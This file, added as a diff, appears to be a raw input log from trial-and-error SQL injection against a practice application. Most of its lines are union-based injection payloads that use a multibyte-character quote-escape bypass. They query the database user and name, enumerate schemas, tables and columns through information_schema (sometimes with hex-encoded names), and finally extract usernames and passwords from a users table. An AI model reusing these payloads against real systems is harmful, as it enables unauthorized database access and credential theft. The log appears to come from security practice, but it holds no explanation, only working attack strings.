@@ -1,0 +1,178 @@
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:2
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1$23
+ID:1$23
+ID:2
+ID:3
+ID:3
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:3
+ID:3
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:3
+ID:2
+ID:9
+ID:9
+ID:9
+ID:5
+ID:4
+ID:4
+ID:4
+ID:3
+ID:1
+ID:10
+ID:1
+ID:1
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:1
+ID:1 union
+ID:1\'
+ID:1ﬂ\'union select 1,user(),3-- 
+ID:1ﬂ\'union select 1,user(),3-- 
+ID:1ﬂ\'union select 1,user(),3-- 
+ID:1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1%**\\\\\'union select 1,user(),3-- 
+ID:-1%**\\\\\'union select 1,user(),3-- 
+ID:-1%**\\\\\'union select 1,user(),3-- 
+ID:-1%**\\\\\'union select 1,user(),3-- 
+ID:-1%**\\\\\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1\'\'union select 1,user(),3-- 
+ID:-1\'0union select 1,user(),3-- 
+ID:-1\\\'union select 1,user(),3-- 
+ID:-1/\'union select 1,user(),3-- 
+ID:-1\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,user(),3-- 
+ID:-1ﬂ\'union select 1,select user(),3-- 
+ID:-1ﬂ\'union select 1,(user()),3-- 
+ID:-1ﬂ\'union select 1,(user()),3-- 
+ID:-1ﬂ\'union select 1,(user()),3-- 
+ID:-1ﬂ\'union select 1,(user()),3-- 
+ID:-1ﬂ\'union select 1,(user()),3-- 
+ID:-1ﬂ\'union select 1,(select user()),3-- 
+ID:-1ﬂ\'union select 1,(select database()),3-- 
+ID:-1ﬂ\'union select 1,(select user()),3-- 
+ID:-1ﬂ\'union select 1,(select user()),3-- 
+ID:-1ﬂ\'union select 1,(select user()),3-- 
+ID:-1ﬂ\'union select 1,(select user()),3-- 
+ID:-1ﬂ\'union select 1,(select schema_name from information_schema.schemata),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(schema_name) from information_schema.schemata),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables wherer table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables wherer table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(schema_name) from information_schema.schemata),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \'security\'-- 
+ID:-1ﬂ\'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \'security\'-- 
+ID:-1ﬂ\'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \'security\'-- 
+ID:-1ﬂ\'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \'security\'-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'\'security\'\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = ﬂ\'securityﬂ\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:1ﬂ\\\' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=\'users\'),3-- 
+ID:1ﬂ\\\' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=\'users\'),3-- 
+ID:1ﬂ\\\' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=\'users\'),3-- 
+ID:1ﬂ\\\' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=\'users\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = \'security\'),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = security),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),3-- 
+ID:-1ﬂ\'union select 1,(select username from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from user),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(username) from users),3-- 
+ID:-1ﬂ\'union select 1,(select group_concat(password) from users),3-- 
+ID:-1ﬂ\'union select 1,(user()),3 #
+ID:-1ﬂ\'union select 1,(user()),3 #
